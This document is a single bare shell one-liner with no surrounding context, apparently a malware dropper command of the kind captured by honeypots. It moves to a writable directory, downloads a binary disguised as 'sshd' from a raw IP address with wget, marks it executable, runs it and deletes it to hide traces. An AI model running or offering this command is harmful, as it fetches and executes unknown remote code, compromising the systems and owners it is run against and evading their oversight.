cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://134.19.186.113/sshd; chmod +x sshd; ./sshd; rm -rf sshd
